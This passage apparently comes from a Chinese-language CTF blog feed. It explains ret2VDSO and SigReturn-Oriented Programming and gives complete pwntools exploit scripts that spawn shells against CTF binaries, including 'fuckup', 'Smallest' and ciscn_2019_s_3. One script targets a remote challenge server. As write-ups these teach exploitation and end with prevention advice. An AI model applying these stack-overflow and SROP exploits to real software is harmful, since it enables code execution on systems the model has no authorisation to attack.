&lt;__kernel_sigreturn+8&gt;:    nop</code></pre><p>关闭 ASLR 对 ret2VDSO 进行测试：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]context.arch = &#39;i386&#39;bin_sh_addr = 0x804a020bss_addr = 0x804a030p = process(&#39;./main&#39;)#gdb.attach(p)vdso_addr = 0xf7fd8000print &#39;Try vdso %s&#39; % hex(vdso_addr)payload = &#39;A&#39; * 0x110frame = SigreturnFrame(kernel=&quot;i386&quot;)frame.eax = constants.SYS_execveframe.ebx = bin_sh_addrframe.eip = vdso_addr + 0xb76 # address of int 0x80frame.esp = bss_addrframe.ebp = bss_addrframe.gs = 0x63frame.cs = 0x23frame.es = 0x2bframe.ds = 0x2bframe.ss = 0x2bret_addr = vdso_addr + 0xb71 # address of sigreturnpayload += p32(ret_addr) + str(frame)p.recvuntil(&#39;&gt; &#39;)p.sendline(payload)p.sendline(&#39;echo pwned&#39;)data = p.recvuntil(&#39;pwned&#39;)if data != &#39;pwned&#39;:    raise Exception, &#39;Failed&#39;p.interactive()</code></pre><p>打开 ASLR 之后对 VDSO 进行爆破（32 位是 $\frac{1}{256}$ 的概率）：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *bin_sh_addr = 0x804a020bss_addr = 0x804a030vdso_range = range(0xf7600000, 0xf7700000, 0x1000)def bruteforce():    global p    context.arch = &#39;i386&#39;    p = process(&#39;./main&#39;)    global vdso_addr    vdso_addr = random.choice(vdso_range)    print &#39;Try vdso %s&#39; % hex(vdso_addr)    payload = &#39;A&#39; * 0x110    frame = SigreturnFrame(kernel=&quot;i386&quot;)    frame.eax = constants.SYS_execve    frame.ebx = bin_sh_addr    frame.eip = vdso_addr + 0xb76 # address of int 0x80    frame.esp = bss_addr    frame.ebp = bss_addr    frame.gs = 0x63    frame.cs = 0x23    frame.es = 0x2b    frame.ds = 0x2b    frame.ss = 0x2b    ret_addr = vdso_addr + 0xb71 # address of sigreturn    payload += p32(ret_addr) + str(frame)    p.recvuntil(&#39;&gt; &#39;)    p.send(payload)    p.sendline(&#39;echo pwned&#39;)    data = p.recvuntil(&#39;pwned&#39;)    if data != &#39;pwned&#39;:        info(&#39;Failed&#39;)    returnif __name__ == &#39;__main__&#39;:    global p, vdso_addr    i = 1    while True:        print &#39;Try %d&#39; % i        try:            bruteforce()        except Exception as e:            info(&#39;Wrong VDSO&#39;)            p.close()            i += 1            continue        info(&#39;vdso_addr = &#39; + hex(vdso_addr))        break    p.interactive()</code></pre><h1 id="Example-x64"><a href="#Example-x64" class="headerlink" title="Example_x64"></a>Example_x64</h1><p>64 位下使用 AXUV 泄漏 VDSO 的例子。主要是输入一串长为 1024 的字符串：</p><pre><code class="nasm">section .textglobal _startjmp _startvuln:sub rsp, 8mov rax, 0 ; sys_readxor rdi, rdimov rsi, rspmov rdx, 1024syscalladd rsp, 8ret_start:call vulnmov rax, 60 ; sys_exitxor rdi, rdisyscallgadgets:mov rdi, 1retmov rax, 15retsyscallret</code></pre><p>尝试利用 vsyscall 中的 <code>syscall ; ret</code> 没能成功，所以在程序后面又加了一个 Gadget 用来构造（具体什么原因没有找到）。在栈上泄漏 AUXV 之后，可以获取 VDSO 的基址以及输入的字符串在栈上的地址。脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]p = process(&#39;./main&#39;)# id&#39;s of Auxillary VectorsAT_SYSINFO_EHDR = 0x21AT_HWCAP = 0x10AT_PAGESZ = 0x06AT_CLKTCK = 0x11AT_PHDR = 0x03AT_PHENT = 0x04AT_PHNUM = 0x05AT_BASE = 0x07AT_FLAGS = 0x08AT_ENTRY = 0x09AT_UID = 0x0bAT_EUID = 0x0cAT_GID = 0x0dAT_EGID = 0x0eAT_SECURE = 0x17AT_RANDOM = 0x19AT_EXECFN = 0x1fAT_PLATFORM = 0x0fgdb.attach(p)vuln_addr = 0x400082set_write = 0x4000acsyscall_addr = 0x400096set_sigreturn = 0x4000b2payload = &#39;/bin/sh\x00&#39;payload += p64(vuln_addr)payload += p64(set_write)payload += p64(syscall_addr)payload += &#39;A&#39; * 8payload += p64(vuln_addr)raw_input(&#39;@&#39;)p.send(payload)payload = &#39;A&#39;raw_input(&#39;@&#39;)p.send(payload)ENV_AUX_VEC = p.recv(1024)QWORD_LIST = []for i in range(0, len(ENV_AUX_VEC), 8):    QWORD_LIST.append(u64(ENV_AUX_VEC[i:i + 8]))start_aux_vec = QWORD_LIST.index(AT_SYSINFO_EHDR) # 计算AUXV的起始地址info(hex(start_aux_vec))AUX_VEC_ENTRIES = QWORD_LIST[start_aux_vec: start_aux_vec + (18 * 2)] # size of auxillary tableAUX_VEC_ENTRIES = dict(AUX_VEC_ENTRIES[i:i + 2] for i in range(0, len(AUX_VEC_ENTRIES), 2))vdso_addr = AUX_VEC_ENTRIES[AT_SYSINFO_EHDR]info(&quot;vdso_addr = &quot; + hex(vdso_addr))bin_sh_addr = AUX_VEC_ENTRIES[AT_RANDOM] - 0x379 # 获取“/bin/sh”地址info(&quot;bin_sh_addr = &quot; + hex(bin_sh_addr))syscall_ret = 0xffffffffff600007syscall_ret = 0x4000b8frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = bin_sh_addrframe.rip = syscall_addrpayload = &#39;A&#39; * 8 + p64(set_sigreturn) + p64(syscall_ret) + str(frame)raw_input(&#39;@&#39;)p.send(payload)p.interactive()</code></pre><h1 id="fuckup"><a href="#fuckup" class="headerlink" title="fuckup"></a>fuckup</h1><p>2015 Defcon Quals 中这道题可以使用 ret2VDSO 和 SROP。具体没能复现出来，主要理解一下思想。</p><pre><code class="bash">$ checksec ./fuckup[*] &#39;/home/beale/Desktop/2015-Defcon-Quals-fuckup/fuckup&#39;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>总共有五个选项，选项 2 会修改程序段和栈的基址，并重新指向新的地址；选项 3 会告诉我们当前的随机数并再次随机化程序段；选项 4 中可以进行溢出：</p><pre><code class="bash">$ ./fuckupWelcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.This app is to help prove the benefits of F.U.C.K.U.P.Main Menu---------1. Display info2. Change random3. View state info4. Test stack smash-------0. Quit</code></pre><p>在选项 2 的代码反编译后可以看到，每次用户执行命令时，程序会根据类似于 WELL512 的生成算法生成的随机数，改变二进制映射的存储器的基址：</p><pre><code class="cpp">int sub_80481A6(){  ...  do  {    seed_1 = WELL512() * 4294967295.0;    seed_2 = (signed __int64)seed_1;    addy = (void *)(seed_2 &amp; 0xFFFFF000);    actual = my_mmap(seed_2 &amp; 0xFFFFF000, 28672, 3, 34, -1, 0, v0, v0);  }  while ( (seed_2 &amp; 0xFFFFF000) != actual );  qmemcpy(addy, dword_804EB40, 0x7000u);  my_mprotect(addy, 0x4000u, 5);  ...}</code></pre><p>普通的思路肯定是做不了的。使用 VDSO 的思路大致如下：</p><ul><li>因为 32 位下 VDSO 只有 1 字节是随机的，可以暴力破解</li><li>直接溢出改返回地址，但只有 100 个字节<ul><li>首先先利用 VDSO 的 Gadget 做出 sys_read 并加大输入的大小</li><li>将读入的内容放到 TLS（TLS 的位置在 VDSO 前一页）</li><li>使用 sysenter 将栈转移到 TLS 段</li><li>在第二次输入的时候将 /bin/sh 放到 TLS 段（这个时候栈已经搬到 TLS 了）</li></ul></li><li>接着把 Sigreturn Gadget 以及 Fake Signal Frame 一并放进，然后可以直接 execve 执行 /bin/sh</li><li>循环直到成功 get shell</li></ul><p>还可以通过 z3 对伪随机数进行预测，脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *from z3 import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;state = [BitVec(&quot;a1_{0}&quot;.format(i), 32) for i in range(16)]def m(x):    return p32(x + offset)def well512(index):    idx = (index+15) &amp; 15    a = state[index]    c = state[(index+13) &amp; 15]    b = a ^ c ^ ((a &lt;&lt; 16) &amp; 0xffffffff) ^ ((c &lt;&lt; 15) &amp; 0xffffffff)    c = state[(index+9) &amp; 15]    c ^= (c &gt;&gt; 11)    state[(index+10) &amp; 15] = c ^ b    a = state[idx]    d = ((32 * (c ^ b)) &amp; 0xDA442D24) ^ c ^ b    state[idx] = a ^ b ^ d ^ ((a &lt;&lt; 2) &amp; 0xffffffff) ^ (        (b &lt;&lt; 18) &amp; 0xffffffff) ^ ((c &lt;&lt; 28) &amp; 0xffffffff)    return idxdef well512_z3(index):    idx = (index+15) &amp; 15    a = state[index]    c = state[(index+13) &amp; 15]    b = a ^ c ^ (a &lt;&lt; 16) ^ (c &lt;&lt; 15)    c = state[(index+9) &amp; 15]    c ^= LShR(c, 11)    a = state[idx]    state[(index+10) &amp; 15] = b ^ c    d = ((32 * (c ^ b)) &amp; 0xDA442D24) ^ c ^ b    a = state[idx]    state[idx] = a ^ b ^ d ^ (a &lt;&lt; 2) ^ (b &lt;&lt; 18) ^ (c &lt;&lt; 28)    return idxdef find_state(recv):    info(&#39;Start find state.&#39;)    global state    z = Solver()    idx = 15    for r in recv:        idx = well512_z3(idx)        z.add(state[idx] == r + 1)    return zp = process(&#39;./fuckup&#39;)def choice(c):    p.recvuntil(&#39;Quit\n&#39;)    p.sendline(str(c))r_list = []for i in range(15):    choice(3)    sleep(0.1)    r = int(p.recv(0x20)[0x11:0x19], 16)    r_list.append(r)info(r_list)z = find_state(r_list)info(&#39;Solver result =&gt; &#39; + str(z.check()))next_state = dict()model = z.model()for i in model:    idx = int(str(i)[3:])    val = model[i].as_long()    next_state[idx] = valinfo(next_state)for i in range(16):    if i in next_state:        state[i] = next_state[i]idx = 15for i in range(15):    idx = well512(idx)idx = well512(idx)predict_val = state[idx] - 1info(&#39;predict_val = &#39; + hex(predict_val))current_base = 0xfffff000 &amp; predict_valinfo(&#39;current_base = &#39; + hex(current_base))base = 0x8048000offset = current_base - base# 0x0804908f : pop eax ; pop ebx ; pop esi ; retpop_eax_ebx_esi_ret = 0x0804908f# 0x0804961a : pop edx ; pop ecx ; pop ebx ; retpop_edx_ecx_ebx_ret = 0x0804961a# 0x0804875f : int 0x80int_0x80 = 0x0804875fpayload = &#39;A&#39; * 0x16payload += m(pop_eax_ebx_esi_ret)payload += p32(0x7D)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x7)payload += p32(0x1000)payload += p32(current_base)payload += m(int_0x80)payload += m(pop_eax_ebx_esi_ret)payload += p32(0x3)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x100)payload += p32(current_base)payload += p32(0)payload += m(int_0x80)payload += p32(current_base)payload = payload.ljust(100, &#39;A&#39;)payload += asm(shellcraft.sh())p.sendline(&#39;4&#39;)p.sendline(payload)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso</a><br><a href="http://adam8157.info/blog/2011/10/linux-vdso/" target="_blank" rel="noopener">http://adam8157.info/blog/2011/10/linux-vdso/</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="https://www.anquanke.com/post/id/85810" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85810</a><br><a href="https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/" target="_blank" rel="noopener">https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/</a><br><a href="https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html" target="_blank" rel="noopener">https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html</a><br><a href="https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/" target="_blank" rel="noopener">https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/</a><br><a href="https://pwnexpoit.tistory.com/13" target="_blank" rel="noopener">https://pwnexpoit.tistory.com/13</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用 SROP 的时候，一般情况下很难找得到 &lt;code&gt;syscall ; ret&lt;/code&gt;，这时就需要在 VDSO 中找了。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Understanding SigReturn-Oriented-Programming</title>
    <link href="blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/"/>
    <id>blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/</id>
    <published>2020-03-13T08:07:27.000Z</published>
    <updated>2020-03-19T15:53:21.513Z</updated>
    
    <content type="html"><![CDATA[<p>去年学 ROP 的时候遗漏的一个技术。</p><a id="more"></a><h1 id="What-is-SROP"><a href="#What-is-SROP" class="headerlink" title="What is SROP"></a>What is SROP</h1><p>SROP（Sigreturn Oriented Programming）于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究 Framing Signals — A Return to Portable Shellcode 发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。</p><p>其中，Sigreturn 是一个系统调用，在类 Unix 系统发生 Signal 的时候会被间接地调用。</p><h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal 机制是类 Unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/1.png" srcset="/img/loading.gif" alt></p><ol><li>首先内核向某个用户态进程发送 Signal 时，该进程会被暂时挂起并进入内核态；</li><li>内核会为该进程保存上下文（类似于保存函数现场，将所有寄存器压入栈，以及压入 Signal 的信息和指向 Sigreturn 的系统调用地址），存储完毕后，回到用户态；</li><li>接着使用用户态中注册过的 Signal Handler 处理相应的 Signal；</li><li>处理完毕后回到内核态，内核执行 Sigreturn 系统调用（32 位的调用号为 77，64 位的调用号为 15），将对应进程的上下文恢复，最后回到用户态。</li></ol><p>在保存进程上下文的时候，用户态的栈中的结构如下。其中 ucontext 以及 siginfo 这一段被称为 Signal Frame，在 Signal Handler 执行完之后，就会执行 Sigreturn 代码：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/2.png" srcset="/img/loading.gif" alt></p><p>Signal Frame 在不同架构下不同。在 x86 中的 sigcontext 结构体如下：</p><pre><code class="cpp">struct sigcontext {    __u16                gs, __gsh;    __u16                fs, __fsh;    __u16                es, __esh;    __u16                ds, __dsh;    __u32                edi;    __u32                esi;    __u32                ebp;    __u32                esp;    __u32                ebx;    __u32                edx;    __u32                ecx;    __u32                eax;    __u32                trapno;    __u32                err;    __u32                eip;    __u16                cs, __csh;    __u32                eflags;    __u32                esp_at_signal;    __u16                ss, __ssh;    struct _fpstate __user        *fpstate; // FPU寄存器状态    __u32                oldmask;    __u32                cr2;};</code></pre><p>在 x64 中的 sigcontext 结构体如下：</p><pre><code class="cpp">struct sigcontext {    __u64                r8;    __u64                r9;    __u64                r10;    __u64                r11;    __u64                r12;    __u64                r13;    __u64                r14;    __u64                r15;    __u64                rdi;    __u64                rsi;    __u64                rbp;    __u64                rbx;    __u64                rdx;    __u64                rax;    __u64                rcx;    __u64                rsp;    __u64                rip;    __u64                eflags;        /* RFLAGS */    __u16                cs;    __u16                gs;    __u16                fs;    __u16                __pad0;    __u64                err;    __u64                trapno;    __u64                oldmask;    __u64                cr2;    struct _fpstate __user        *fpstate;    /* Zero when no FPU context */    __u64                reserved1[8];};</code></pre><h2 id="SROP-Theory"><a href="#SROP-Theory" class="headerlink" title="SROP Theory"></a>SROP Theory</h2><p>在 Signal 机制的整个过程中，内核所做的主要工作就是为进程保存上下文以及恢复上下文。所改变的 Signal Frame 是处在用户的地址空间中的，所以可以得出一下结论：</p><ul><li>Signal Frame 可以被用户读写；</li><li>因为内核没有直接参与 Signal，所以内核并不知道保存的 Signal Frame 是否是真正的进程上下文（即执行 Sigreturn 的时候）。</li></ul><p>那么就可以构造出假的 Signal Frame，提前把 RDI、RSI、RIP 等寄存器的值放在构造的结构体中，执行完 Sigreturn 后就会给各个寄存器设置好值。构造 SROP 的条件如下：</p><ul><li>可以通过栈溢出来控制栈</li><li>需要知道一些地址<ul><li><code>&amp;&quot;/bin/sh&quot;</code></li><li>Signal Frame</li><li>Gadget：<code>syscall ; ret</code></li><li>Sigreturn</li></ul></li><li>需要有足够大的空间来放下 Signal Frame</li></ul><p>在 pwntools 中也集成了 SROP 的工具，即 <code>SigreturnFrame()</code>，用于构造假的 sigcontext 结构体（Signal Frame）。</p><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>我们可以自行构造一个程序，使用 SROP 进行一个简单的利用：</p><pre><code class="cpp">char buf[0x200];int main(){    asm(        // 读取 0x200 字节        &quot;mov rax, 0\n&quot; // sys_read        &quot;mov rdi, 0\n&quot; // fd        &quot;lea rsi, %0\n&quot; // buf        &quot;mov rdx, 0x200\n&quot; // count        &quot;syscall\n&quot;        // 恢复进程上下文        &quot;mov rax, 15\n&quot; // sys_rt_sigaction        &quot;mov rdi, 0\n&quot;        &quot;mov rsp, rsi\n&quot; // 把buf作为栈        // syscall 的 symbol，便于查找        &quot;syscall:\n&quot;        &quot;syscall\n&quot;        &quot;jmp exit\n&quot;        // 退出程序        &quot;exit:\n&quot;        &quot;mov rax, 60\n&quot; // sys_exit        &quot;mov rdi, 0\n&quot;        &quot;syscall\n&quot;        :        : &quot;m&quot; (buf)        :        );}</code></pre><p>构造出 Signal Frame，并在 buf 上设置好字符串，发送 payload 后拿到 shell：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;p = process(&#39;./main&#39;)elf = ELF(&#39;./main&#39;)#gdb.attach(p)# 构造假的Signal Frameframe = SigreturnFrame()frame.rax = constants.SYS_execve # 设置系统调用号为sys_execveframe.rdi = elf.symbols[&#39;buf&#39;] + 0x100 # 设置第一个参数为偏移0x100处的“/bin/sh”字符串frame.rsi = 0frame.rdx = 0frame.rip = elf.symbols[&#39;syscall&#39;]payload = str(frame).ljust(0x100, &#39;A&#39;) + &#39;/bin/sh\x00&#39; # 设置payloadp.send(payload)p.interactive()</code></pre><p>调试的时候可以看到 Sigreturn 后各个寄存器被设置的值，然后就能调用 execve 的系统调用了：</p><pre><code class="gdb">──────────────────────────────────── Code ────────────────────────────────────   0x40010a &lt;main+34&gt;:    mov    rax,0xf   0x400111 &lt;main+41&gt;:    mov    rdi,0x0   0x400118 &lt;main+48&gt;:    mov    rsp,rsi=&gt; 0x40011b &lt;main+51&gt;:    syscall   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;   0x40011f &lt;main+55&gt;:    mov    rax,0x3c   0x400126 &lt;main+62&gt;:    mov    rdi,0x0   0x40012d &lt;main+69&gt;:    syscall────────────────────────────── System call info ──────────────────────────────rt_sigreturn()───────────────────────────────── SROP info ──────────────────────────────────       ss_size:0x0000000000000000           rsi:0x0000000000000000           rax:0x000000000000003b           rbp:0x0000000000000000        eflags:0x0000000000000000           rcx:0x0000000000000000           rip:0x000000000040011b           r13:0x0000000000000000           cr2:0x0000000000000000           r12:0x0000000000000000           rbx:0x0000000000000000       uc_link:0x0000000000000000           err:0x0000000000000000        trapno:0x0000000000000000           r10:0x0000000000000000      ss_flags:0x0000000000000000         ss_sp:0x0000000000000000           rdi:0x0000000000600280      uc_flags:0x0000000000000000           r14:0x0000000000000000            r8:0x0000000000000000      selector:0x0000000000000033            r9:0x0000000000000000           rdx:0x0000000000000000           rsp:0x0000000000000000       oldmask:0x0000000000000000           r11:0x0000000000000000           r15:0x0000000000000000...──────────────────────────────────── Code ────────────────────────────────────   0x40010a &lt;main+34&gt;:    mov    rax,0xf   0x400111 &lt;main+41&gt;:    mov    rdi,0x0   0x400118 &lt;main+48&gt;:    mov    rsp,rsi=&gt; 0x40011b &lt;main+51&gt;:    syscall   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;   0x40011f &lt;main+55&gt;:    mov    rax,0x3c   0x400126 &lt;main+62&gt;:    mov    rdi,0x0   0x40012d &lt;main+69&gt;:    syscall────────────────────────────── System call info ──────────────────────────────execve(const char *name = 0x600280,const char *const *argv = 0x0,const char *const *envp = 0x0)const char *name : 0x600280 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)const char *const *argv : 0x0const char *const *envp : 0x0</code></pre><h1 id="Smallest"><a href="#Smallest" class="headerlink" title="Smallest"></a>Smallest</h1><p>程序只开了 NX，Got 表可写、没有 Canary 保护、没开 PIE：</p><pre><code class="bash">$ checksec ./smallest[*] &#39;/home/beale/SROP/2017-360Chunqiu-Smallest/smallest&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>2017 年 360 春秋杯的 Smallest 可以用 SROP 实现利用。程序由汇编实现，整体只有几条语句：</p><pre><code class="bash">$ objdump -d ./smallest -M intel./smallest:     file format elf64-x86-64Disassembly of section .text:00000000004000b0 &lt;.text&gt;:  4000b0:    48 31 c0                 xor    rax,rax  4000b3:    ba 00 04 00 00           mov    edx,0x400  4000b8:    48 89 e6                 mov    rsi,rsp  4000bb:    48 89 c7                 mov    rdi,rax  4000be:    0f 05                    syscall  4000c0:    c3                       ret</code></pre><p>可以看到 <code>4000be</code> 处的是 <code>syscall ; ret</code>，可以作为利用。而整个程序，是实现了一个 read 的系统调用，总共读 0x400 个字节到栈上。利用方法是先泄露出一个栈上的地址，然后通过 SROP 构造一个 read 调用往这个已知的地址上写数据，并再次利用 SROP 构造一个 execve 的调用；第二种方法是使用 mprotect 将不可执行的栈改为 rwx，然后执行 shellcode。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><pre><code class="python">#!/usr/bin/env python#-*- encoding=utf-8 -*-from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]p = process(&#39;./smallest&#39;)elf = ELF(&#39;./smallest&#39;)#gdb.attach(p)main_addr = 0x4000b0syscall_addr = 0x4000bepayload = p64(main_addr) * 3 # 栈上放3个main的地址，第1个main用来修改rax，第2个main用来泄漏栈，第3个main为了之后的输入raw_input(&#39;@main*3&#39;)p.send(payload)payload = &#39;\xb3&#39; # 修改第2个main的地址为0x4000b3，同时可以将rax和rdi设置为1，可以泄漏栈的地址raw_input(&#39;@leak stack&#39;)p.send(payload)p.recv(8)stack_addr = u64(p.recv(8))info(&#39;stack_addr = &#39; + hex(stack_addr))payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_read # sys_read的调用号frame.rdi = 0frame.rsi = stack_addrframe.rdx = 0x400frame.rsp = stack_addrframe.rip = syscall_addrpayload += str(frame) # 读0x400个字节到新的栈上，并把栈搬到新的栈上raw_input(&#39;@fake sigcontext to pivot stack&#39;)p.send(payload)payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input(&#39;@set rax=15&#39;)p.send(payload)# 下面开始往新的栈上写东西bin_sh_addr = stack_addr + 2 * 8 + len(SigreturnFrame()) # 设置“/bin/sh”字符串的地址payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_execve # sys_execve的调用号frame.rdi = bin_sh_addrframe.rip = syscall_addrpayload += str(frame) + &#39;/bin/sh\x00&#39; # 开shellraw_input(&#39;@fake sigcontext to exec shell&#39;)p.send(payload)payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input(&#39;@set rax=15&#39;)p.send(payload)p.interactive()</code></pre><p>第二种方法即在新的栈上写东西时构造出 mprotect 的调用，并添加 shellcode：</p><pre><code class="python">payload = p64(main_addr) + p64(syscall_addr)frame = SigreturnFrame()frame.rax = constants.SYS_mprotectframe.rdi = stack_addr &amp; 0xfffffffffffff000frame.rsi = 0x1000frame.rdx = 0x7frame.rsp = stack_addr + 0x108 # 设置栈的位置frame.rip = syscall_addrpayload += str(frame)payload += p64(stack_addr + 0x110) # 设置return的地址payload += asm(shellcraft.sh())p.send(payload)</code></pre><h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>保护和上面开的一样：</p><pre><code class="bash">$ checksec ./ciscn_s_3[*] &#39;/root/tmp/ciscn_2019_s_3/ciscn_s_3&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>程序在 main 中调用了 vuln：</p><pre><code class="asm">000000000040051d &lt;main&gt;:  40051d:    55                       push   rbp  40051e:    48 89 e5                 mov    rbp,rsp  400521:    48 83 ec 10              sub    rsp,0x10  400525:    89 7d fc                 mov    DWORD PTR [rbp-0x4],edi  400528:    48 89 75 f0              mov    QWORD PTR [rbp-0x10],rsi  40052c:    b8 00 00 00 00           mov    eax,0x0  400531:    e8 b7 ff ff ff           call   4004ed &lt;vuln&gt;  400536:    90                       nop  400537:    c9                       leave  400538:    c3                       ret</code></pre><p>vuln 中读了 0x400 到 <code>[rsp-0x10]</code> 处，并输出 0x30 个字节。读了这么多有足够的空间进行 SROP：</p><pre><code class="asm">00000000004004ed &lt;vuln&gt;:  4004ed:    55                       push   rbp  4004ee:    48 89 e5                 mov    rbp,rsp  4004f1:    48 31 c0                 xor    rax,rax  4004f4:    ba 00 04 00 00           mov    edx,0x400  4004f9:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]  4004fe:    48 89 c7                 mov    rdi,rax  400501:    0f 05                    syscall  400503:    48 c7 c0 01 00 00 00     mov    rax,0x1  40050a:    ba 30 00 00 00           mov    edx,0x30  40050f:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]  400514:    48 89 c7                 mov    rdi,rax  400517:    0f 05                    syscall  400519:    c3                       ret  40051a:    90                       nop  40051b:    5d                       pop    rbp  40051c:    c3                       ret</code></pre><p>另外还提供了 sys_execve 和 sys_sigreturn 的调用号：</p><pre><code class="asm">00000000004004d6 &lt;gadgets&gt;:  4004d6:    55                       push   rbp  4004d7:    48 89 e5                 mov    rbp,rsp  4004da:    48 c7 c0 0f 00 00 00     mov    rax,0xf  4004e1:    c3                       ret  4004e2:    48 c7 c0 3b 00 00 00     mov    rax,0x3b  4004e9:    c3                       ret  4004ea:    90                       nop  4004eb:    5d                       pop    rbp  4004ec:    c3                       ret</code></pre><p>这题相对简单一些，可以写 <code>&quot;/bin/sh&quot;</code> 到栈上，然后通过 write 的输出计算出地址，最后直接调 SROP。</p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]local = 0if local:  p = process(&#39;./ciscn_s_3&#39;)else:    p = remote(&#39;node3.buuoj.cn&#39;, 28526)#gdb.attach(p)vuln_addr = 0x4004f1set_sigreturn_addr = 0x4004daset_execve_addr = 0x4004e2syscall_ret = 0x400517payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;A&#39;) + p64(vuln_addr)raw_input(&#39;@&#39;)p.send(payload)p.recv(32)stack_addr = u64(p.recv(8))info(&#39;stack_addr = &#39; + hex(stack_addr))bin_sh_addr = stack_addr - 0x118payload = p64(set_sigreturn_addr) + p64(syscall_ret)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = bin_sh_addrframe.rip = syscall_retpayload += str(frame)raw_input(&#39;@&#39;)p.send(payload)p.interactive()</code></pre><h1 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h1><h2 id="Gadgets-Prevention"><a href="#Gadgets-Prevention" class="headerlink" title="Gadgets Prevention"></a>Gadgets Prevention</h2><p>在当前的几种不同的操作系统中，<code>sigreturn</code> 和 <code>syscall; ret</code> 这两个 Gadgets 非常容易被找到，特别是在 <code>vsyscall</code> 这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让 ASLR 等保护机制物尽其用，使得攻击者很难找到这些 